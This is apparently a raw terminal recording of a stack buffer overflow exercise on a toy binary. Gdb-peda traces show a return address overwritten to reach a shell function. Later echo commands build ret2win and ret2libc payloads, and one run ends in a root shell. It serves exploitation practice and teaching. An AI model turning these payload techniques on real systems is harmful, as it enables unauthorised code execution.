+[m0024| [;34m0xffffcf48[0m --> [;34m0x804975c[0m --> [;34m0x8049670[0m --> 0x1 [0m
+[m0028| [;34m0xffffcf4c[0m --> [;31m0x80484e2[0m (<__libc_csu_init+82>:	add    edi,0x1)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x08048455 in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: 0x0 
+[;32mEDX[0m: [;34m0xf7fad884[0m --> 0x0 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m ("AAAA+\204\004\b")
+[;32mESP[0m: [;34m0xffffcf30[0m --> [;32m0x8048528[0m --> 0x7325 ('%s')
+[;32mEIP[0m: [;31m0x804845a[0m (<vul+23>:	add    esp,0x10)[0m
+[m[;32mEFLAGS[0m: 0x286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x804844f <vul+12>:[;2m	push   eax[0m
+   0x8048450 <vul+13>:[;2m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;2;31m	call   0x8048300 <scanf@plt>[0m
+=> 0x804845a <vul+23>:[;1;32m	add    esp,0x10[0m
+   0x804845d <vul+26>:[m	leave  [0m
+   0x804845e <vul+27>:[;34m	ret    [0m
+   0x804845f <main>:[m	lea    ecx,[esp+0x4][0m
+   0x8048463 <main+4>:[m	and    esp,0xfffffff0[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf30[0m --> [;32m0x8048528[0m --> 0x7325 ('%s')[0m
+[m0004| [;34m0xffffcf34[0m --> [;34m0xffffcf40[0m ('A' <repeats 28 times>, "+\204\004\b")[0m
+[m0008| [;34m0xffffcf38[0m --> 0x1 [0m
+[m0012| [;34m0xffffcf3c[0m --> [;31m0x80482bd[0m (<_init+9>:	add    ebx,0x149f)[0m
+[m0016| [;34m0xffffcf40[0m ('A' <repeats 28 times>, "+\204\004\b")[0m
+[m0020| [;34m0xffffcf44[0m ('A' <repeats 24 times>, "+\204\004\b")[0m
+[m0024| [;34m0xffffcf48[0m ('A' <repeats 20 times>, "+\204\004\b")[0m
+[m0028| [;34m0xffffcf4c[0m ('A' <repeats 16 times>, "+\204\004\b")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804845a in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: 0x0 
+[;32mEDX[0m: [;34m0xf7fad884[0m --> 0x0 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m ("AAAA+\204\004\b")
+[;32mESP[0m: [;34m0xffffcf40[0m ('A' <repeats 28 times>, "+\204\004\b")
+[;32mEIP[0m: [;31m0x804845d[0m (<vul+26>:	leave)[0m
+[m[;32mEFLAGS[0m: 0x282 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048450 <vul+13>:[;2m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;2;31m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[;2m	add    esp,0x10[0m
+=> 0x804845d <vul+26>:[;1;32m	leave  [0m
+   0x804845e <vul+27>:[;34m	ret    [0m
+   0x804845f <main>:[m	lea    ecx,[esp+0x4][0m
+   0x8048463 <main+4>:[m	and    esp,0xfffffff0[0m
+   0x8048466 <main+7>:[m	push   DWORD PTR [ecx-0x4][0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf40[0m ('A' <repeats 28 times>, "+\204\004\b")[0m
+[m0004| [;34m0xffffcf44[0m ('A' <repeats 24 times>, "+\204\004\b")[0m
+[m0008| [;34m0xffffcf48[0m ('A' <repeats 20 times>, "+\204\004\b")[0m
+[m0012| [;34m0xffffcf4c[0m ('A' <repeats 16 times>, "+\204\004\b")[0m
+[m0016| [;34m0xffffcf50[0m ('A' <repeats 12 times>, "+\204\004\b")[0m
+[m0020| [;34m0xffffcf54[0m ("AAAAAAAA+\204\004\b")[0m
+[m0024| [;34m0xffffcf58[0m ("AAAA+\204\004\b")[0m
+[m0028| [;34m0xffffcf5c[0m --> [;31m0x804842b[0m (<run_shell>:	push   ebp)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804845d in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: 0x0 
+[;32mEDX[0m: [;34m0xf7fad884[0m --> 0x0 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: 0x41414141 ('AAAA')
+[;32mESP[0m: [;34m0xffffcf5c[0m --> [;31m0x804842b[0m (<run_shell>:	push   ebp)
+[;32mEIP[0m: [;31m0x804845e[0m (<vul+27>:	ret)[0m
+[m[;32mEFLAGS[0m: 0x282 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048455 <vul+18>:[;2;31m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[;2m	add    esp,0x10[0m
+   0x804845d <vul+26>:[;2m	leave  [0m
+=> 0x804845e <vul+27>:[;1;32m	ret    [0m
+   0x804845f <main>:[m	lea    ecx,[esp+0x4][0m
+   0x8048463 <main+4>:[m	and    esp,0xfffffff0[0m
+   0x8048466 <main+7>:[m	push   DWORD PTR [ecx-0x4][0m
+   0x8048469 <main+10>:[m	push   ebp[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf5c[0m --> [;31m0x804842b[0m (<run_shell>:	push   ebp)[0m
+[m0004| [;34m0xffffcf60[0m --> [;34m0xf7fac300[0m --> [;32m0xf7f622ec[0m ("ISO-10646/UCS2/")[0m
+[m0008| [;34m0xffffcf64[0m --> [;34m0xffffcf80[0m --> 0x1 [0m
+[m0012| [;34m0xffffcf68[0m --> 0x0 [0m
+[m0016| [;34m0xffffcf6c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0020| [;34m0xffffcf70[0m --> [;31m0x8048490[0m (<__libc_csu_init>:	push   ebp)[0m
+[m0024| [;34m0xffffcf74[0m --> 0x0 [0m
+[m0028| [;34m0xffffcf78[0m --> 0x0 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804845e in vul ()
+[;31mgdb-peda$ [0mx/40x $esp
+0xffffcf5c:	0x0804842b	0xf7fac300	0xffffcf80	0x00000000
+0xffffcf6c:	0xf7e1ca63	0x08048490	0x00000000	0x00000000
+0xffffcf7c:	0xf7e1ca63	0x00000001	0xffffd014	0xffffd01c
+0xffffcf8c:	0xf7feac3a	0x00000001	0xffffd014	0xffffcfb4
+0xffffcf9c:	0x08049774	0x0804820c	0xf7fac000	0x00000000
+0xffffcfac:	0x00000000	0x00000000	0xa95abc10	0x9551f800
+0xffffcfbc:	0x00000000	0x00000000	0x00000000	0x00000001
+0xffffcfcc:	0x08048330	0x00000000	0xf7ff0470	0xf7e1c979
+0xffffcfdc:	0xf7ffd000	0x00000001	0x08048330	0x00000000
+0xffffcfec:	0x08048351	0x0804845f	0x00000001	0xffffd014
+[;31mgdb-peda$ [0mx/40x $esp-0x40
+0xffffcf1c:	0x00000000	0xffffcf40	0xf7ffd938	0xf7fac000
+0xffffcf2c:	0x0804845a	0x08048528	0xffffcf40	0x00000001
+0xffffcf3c:	0x080482bd	0x41414141	0x41414141	0x41414141
+0xffffcf4c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf5c:	0x0804842b	0xf7fac300	0xffffcf80	0x00000000
+0xffffcf6c:	0xf7e1ca63	0x08048490	0x00000000	0x00000000
+0xffffcf7c:	0xf7e1ca63	0x00000001	0xffffd014	0xffffd01c
+0xffffcf8c:	0xf7feac3a	0x00000001	0xffffd014	0xffffcfb4
+0xffffcf9c:	0x08049774	0x0804820c	0xf7fac000	0x00000000
+0xffffcfac:	0x00000000	0x00000000	0xa95abc10	0x9551f800
+[;31mgdb-peda$ [0msi
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: 0x0 
+[;32mEDX[0m: [;34m0xf7fad884[0m --> 0x0 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: 0x41414141 ('AAAA')
+[;32mESP[0m: [;34m0xffffcf60[0m --> [;34m0xf7fac300[0m --> [;32m0xf7f622ec[0m ("ISO-10646/UCS2/")
+[;32mEIP[0m: [;31m0x804842b[0m (<run_shell>:	push   ebp)[0m
+[m[;32mEFLAGS[0m: 0x282 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048422 <frame_dummy+34>:[;2m	add    esp,0x10[0m
+   0x8048425 <frame_dummy+37>:[;2m	leave  [0m
+   0x8048426 <frame_dummy+38>:[;2;33m	jmp    0x80483a0 <register_tm_clones>[0m
+=> 0x804842b <run_shell>:[;1;32m	push   ebp[0m
+   0x804842c <run_shell+1>:[m	mov    ebp,esp[0m
+   0x804842e <run_shell+3>:[m	sub    esp,0x8[0m
+   0x8048431 <run_shell+6>:[m	sub    esp,0xc[0m
+   0x8048434 <run_shell+9>:[m	push   0x8048520[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf60[0m --> [;34m0xf7fac300[0m --> [;32m0xf7f622ec[0m ("ISO-10646/UCS2/")[0m
+[m0004| [;34m0xffffcf64[0m --> [;34m0xffffcf80[0m --> 0x1 [0m
+[m0008| [;34m0xffffcf68[0m --> 0x0 [0m
+[m0012| [;34m0xffffcf6c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0016| [;34m0xffffcf70[0m --> [;31m0x8048490[0m (<__libc_csu_init>:	push   ebp)[0m
+[m0020| [;34m0xffffcf74[0m --> 0x0 [0m
+[m0024| [;34m0xffffcf78[0m --> 0x0 [0m
+[m0028| [;34m0xffffcf7c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804842b in run_shell ()
+[;31mgdb-peda$ [0mc
+Continuing.
+[New process 6535]
+process 6535 is executing new program: /bin/dash
+[New process 6536]
+process 6536 is executing new program: /bin/dash
+[Inferior 3 (process 6536) exited normally]
+[m[;33mWarning: not running or target is remote[0m[0m
+[;31mgdb-peda$ [0mr
+Starting program: /bin/dash 
+# 
+[Inferior 3 (process 6671) exited normally]
+[m[;33mWarning: not running or target is remote[0m[0m
+[;31mgdb-peda$ [0mquit
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=gdb a.out[?1l>
+kgdb\GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from a.out...(no debugging symbols found)...done.
+[;31mgdb-peda$ [0m(reverse-i-search)`': r': r ': r < in[1@<[C[C[C[15P[;31mgdb-peda$ [0m[C[C[C[C[C[C[K[K[K[K
+Starting program: /root/test/a.out 
+^C
+Program received signal SIGINT, Interrupt.
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0xfffffe00 
+[;32mEBX[0m: 0x0 
+[;32mECX[0m: [;34m0xf7fd7000[0m --> 0x0 
+[;32mEDX[0m: 0x400 
+[;32mESI[0m: [;34m0xf7facc20[0m --> 0xfbad2288 
+[;32mEDI[0m: [;34m0xf7facac0[0m --> 0xfbad2084 
+[;32mEBP[0m: [;34m0xf7e02700[0m (0xf7e02700)
+[;32mESP[0m: [;34m0xffffcc98[0m --> [;34m0xf7e02700[0m (0xf7e02700)
+[;32mEIP[0m: [;31m0xf7fdbc00[0m (<__kernel_vsyscall+16>:	pop    ebp)[0m
+[m[;32mEFLAGS[0m: 0x296 ([;32mcarry[0m [;1;31mPARITY[0m [;1;31mADJUST[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0xf7fdbbfc <__kernel_vsyscall+12>:[;2m	nop[0m
+   0xf7fdbbfd <__kernel_vsyscall+13>:[;2m	nop[0m
+   0xf7fdbbfe <__kernel_vsyscall+14>:[;2m	int    0x80[0m
+=> 0xf7fdbc00 <__kernel_vsyscall+16>:[;1;32m	pop    ebp[0m
+   0xf7fdbc01 <__kernel_vsyscall+17>:[m	pop    edx[0m
+   0xf7fdbc02 <__kernel_vsyscall+18>:[m	pop    ecx[0m
+   0xf7fdbc03 <__kernel_vsyscall+19>:[;34m	ret    [0m
+   0xf7fdbc04:[m	lods   al,BYTE PTR ds:[esi][0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcc98[0m --> [;34m0xf7e02700[0m (0xf7e02700)[0m
+[m0004| [;34m0xffffcc9c[0m --> 0x400 [0m
+[m0008| [;34m0xffffcca0[0m --> [;34m0xf7fd7000[0m --> 0x0 [0m
+[m0012| [;34m0xffffcca4[0m --> [;31m0xf7edeed3[0m (<read+35>:	pop    ebx)[0m
+[m0016| [;34m0xffffcca8[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 [0m
+[m0020| [;34m0xffffccac[0m --> [;31m0xf7e72163[0m (<_IO_file_underflow+275>:	cmp    eax,0x0)[0m
+[m0024| [;34m0xffffccb0[0m --> 0x0 [0m
+[m0028| [;34m0xffffccb4[0m --> [;34m0xf7fd7000[0m --> 0x0 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+[mStopped reason: [;31mSIGINT[0m[0m
+0xf7fdbc00 in __kernel_vsyscall ()
+[;31mgdb-peda$ [0mp system
+$1 = {<text variable, no debug info>} 0xf7e413e0 <system>
+[;31mgdb-peda$ [0mfind ?[K[K[K[K[K[Khelp find
+[;32mAlias for 'peda searchmem'[0m
+[;31mgdb-peda$ [0mhelp find[K[K[K[K[K[K[K[K[K(reverse-i-search)`': f': x/8xw 0xffffd4e0-0x10[8Pi': find /bin/sh[1@n[C[C[C[1@d[C[C[C[1@ [C[C[C[17P[;31mgdb-peda$ [0m
+[mSearching for '/bin/sh' in: None ranges[0m
+[mFound 3 results, display max 3 items:[0m
+[ma.out : [;32m0x8048520[0m ("/bin/sh")[0m
+[ma.out : [;34m0x8049520[0m ("/bin/sh")[0m
+[m libc : [;32m0xf7f62a89[0m ("/bin/sh")[0m
+[;31mgdb-peda$ [0mquit
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=
+bck-i-search: _[KM[11C(cat ./in; [4me[24mcho ls) | ./a.out[1B[41De_M[21C[4me[4mc[24m[1B[24Dc_M[20C[1C[4mc[4mh[24m[1B[24Dh_M[19C[2C[4mh[4mo[24m[1B[24Do_M[18C[3C[4mo[4m [24m[1B[24D _M[17C[11D[4me[4mc[4mh[4mo[4m [4m'[24mAAAAA[24mA[24mA[24mA[24mA[24mAAAAAAAAAAAAAAAAAAA\x2b\x84\x04\x08' > in[1B[63D'_M[5C[24me[24mc[24mh[24mo[24m [24m'[1B[KM[27C[55C' > in   [9D' > in    [10D' > in    [10D' > in ' > in ' > in f' > in7' > in\' > inx' > ine' > in4' > in\' > inx' > in' > in ' > in ' > in ' > in ' > in ' > in ' > in ' > in e' > in0' > in\' > inx' > in1' > in3' > in\' > inx' > ine' > in4' > in\' > inx' > inf' > in7' > inA' > in' > in B' > inB' > inB' > inB' > in\' > inx' > in8' > in9' > in\' > inx' > in2' > ina' > in\' > inx' > inf' > in6' > in\' > inx' > inf' > in7' > in[?1l>[1Bkecho\[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=
+bck-i-search: _[KM[11Ce[4mc[24mho 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe0\x13\xe4\xf7BBBB\x89\x2a\xf6\xf7' > in[1B[88Dc_M[11C([24mcat ./in; [4mc[4ma[24mt) | ./subdir/a.out                                            [1B[87Da_M[20C[1C[4ma[4mt[24m[1B[24Dt_M[19C[24mc[24ma[24mt[1B[KM[38C[20C            a.out[1m [0m[0m [?1l>[1Bk(cat\id
+uid=0(root) gid=0(root) groups=0(root)
+^C
+[1]    7009 interrupt           ( cat ./in; cat; ) | 
+       7011 segmentation fault  ./a.out
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;31m➜ [23m [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=ggb g gdb a.out[1m [0m[0m [?1l>
+kgdb\GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from a.out...(no debugging symbols found)...done.
+[;31mgdb-peda$ [0m(reverse-i-search)`': [3@r': r[1@ [C[C[C<': r < in[1@ [C[C[C[16P[;31mgdb-peda$ [0m
+Starting program: /root/test/a.out < in
+[New process 7064]
+process 7064 is executing new program: /bin/dash
+[New process 7065]
+process 7065 is executing new program: /bin/dash
+[Inferior 3 (process 7065) exited normally]
+[m[;33mWarning: not running or target is remote[0m[0m
+[;31mgdb-peda$ [0mb main
+Function "main" not defined.
+[;31mgdb-peda$ [0m(reverse-i-search)`': [12P[;31mgdb-peda$ [0m
+Function "main" not defined.
+[;31mgdb-peda$ [0mquit
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=gdb a.out[?1l>
+kgdb\GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from a.out...(no debugging symbols found)...done.
+[;31mgdb-peda$ [0mb main
+Breakpoint 1 at 0x804846d
+[;31mgdb-peda$ [0m(reverse-i-search)`': r': r < in[13P[;31mgdb-peda$ [0m
+Starting program: /root/test/a.out < in
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf64[0m --> [;34m0xffffcf80[0m --> 0x1 
+[;32mEIP[0m: [;31m0x804846d[0m (<main+14>:	sub    esp,0x4)[0m
+[m[;32mEFLAGS[0m: 0x282 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048469 <main+10>:[;2m	push   ebp[0m
+   0x804846a <main+11>:[;2m	mov    ebp,esp[0m
+   0x804846c <main+13>:[;2m	push   ecx[0m
+=> 0x804846d <main+14>:[;1;32m	sub    esp,0x4[0m
+   0x8048470 <main+17>:[;32m	call   0x8048443 <vul>[0m
+   0x8048475 <main+22>:[m	mov    eax,0x0[0m
+   0x804847a <main+27>:[m	add    esp,0x4[0m
+   0x804847d <main+30>:[m	pop    ecx[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf64[0m --> [;34m0xffffcf80[0m --> 0x1 [0m
+[m0004| [;34m0xffffcf68[0m --> 0x0 [0m
+[m0008| [;34m0xffffcf6c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0012| [;34m0xffffcf70[0m --> [;31m0x8048490[0m (<__libc_csu_init>:	push   ebp)[0m
+[m0016| [;34m0xffffcf74[0m --> 0x0 [0m
+[m0020| [;34m0xffffcf78[0m --> 0x0 [0m
+[m0024| [;34m0xffffcf7c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0028| [;34m0xffffcf80[0m --> 0x1 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Breakpoint 1, 0x0804846d in main ()
+[;31mgdb-peda$ [0mb syste[K[K[K[K[K[K[Ksi
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf60[0m --> [;34m0xf7fac3c4[0m --> [;34m0xf7fad1e0[0m --> 0x0 
+[;32mEIP[0m: [;31m0x8048470[0m (<main+17>:	call   0x8048443 <vul>)[0m
+[m[;32mEFLAGS[0m: 0x286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x804846a <main+11>:[;2m	mov    ebp,esp[0m
+   0x804846c <main+13>:[;2m	push   ecx[0m
+   0x804846d <main+14>:[;2m	sub    esp,0x4[0m
+=> 0x8048470 <main+17>:[;1;32m	call   0x8048443 <vul>[0m
+   0x8048475 <main+22>:[m	mov    eax,0x0[0m
+   0x804847a <main+27>:[m	add    esp,0x4[0m
+   0x804847d <main+30>:[m	pop    ecx[0m
+   0x804847e <main+31>:[m	pop    ebp[0m[0m
+[mGuessed arguments:[0m
+[marg[0]: [;34m0xf7fac3c4[0m --> [;34m0xf7fad1e0[0m --> 0x0 [0m
+[marg[1]: [;34m0xffffcf80[0m --> 0x1 [0m
+[marg[2]: 0x0 [0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf60[0m --> [;34m0xf7fac3c4[0m --> [;34m0xf7fad1e0[0m --> 0x0 [0m
+[m0004| [;34m0xffffcf64[0m --> [;34m0xffffcf80[0m --> 0x1 [0m
+[m0008| [;34m0xffffcf68[0m --> 0x0 [0m
+[m0012| [;34m0xffffcf6c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0016| [;34m0xffffcf70[0m --> [;31m0x8048490[0m (<__libc_csu_init>:	push   ebp)[0m
+[m0020| [;34m0xffffcf74[0m --> 0x0 [0m
+[m0024| [;34m0xffffcf78[0m --> 0x0 [0m
+[m0028| [;34m0xffffcf7c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x08048470 in main ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf5c[0m --> [;31m0x8048475[0m (<main+22>:	mov    eax,0x0)
+[;32mEIP[0m: [;31m0x8048443[0m (<vul>:	push   ebp)[0m
+[m[;32mEFLAGS[0m: 0x286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x804843e <run_shell+19>:[;2m	add    esp,0x10[0m
+   0x8048441 <run_shell+22>:[;2m	leave  [0m
+   0x8048442 <run_shell+23>:[;2;34m	ret    [0m
+=> 0x8048443 <vul>:[;1;32m	push   ebp[0m
+   0x8048444 <vul+1>:[m	mov    ebp,esp[0m
+   0x8048446 <vul+3>:[m	sub    esp,0x18[0m
+   0x8048449 <vul+6>:[m	sub    esp,0x8[0m
+   0x804844c <vul+9>:[m	lea    eax,[ebp-0x18][0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf5c[0m --> [;31m0x8048475[0m (<main+22>:	mov    eax,0x0)[0m
+[m0004| [;34m0xffffcf60[0m --> [;34m0xf7fac3c4[0m --> [;34m0xf7fad1e0[0m --> 0x0 [0m
+[m0008| [;34m0xffffcf64[0m --> [;34m0xffffcf80[0m --> 0x1 [0m
+[m0012| [;34m0xffffcf68[0m --> 0x0 [0m
+[m0016| [;34m0xffffcf6c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0020| [;34m0xffffcf70[0m --> [;31m0x8048490[0m (<__libc_csu_init>:	push   ebp)[0m
+[m0024| [;34m0xffffcf74[0m --> 0x0 [0m
+[m0028| [;34m0xffffcf78[0m --> 0x0 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x08048443 in vul ()
+[;31mgdb-peda$ [0mni
+[;34m[----------------------------------registers-----------------------------------][0m
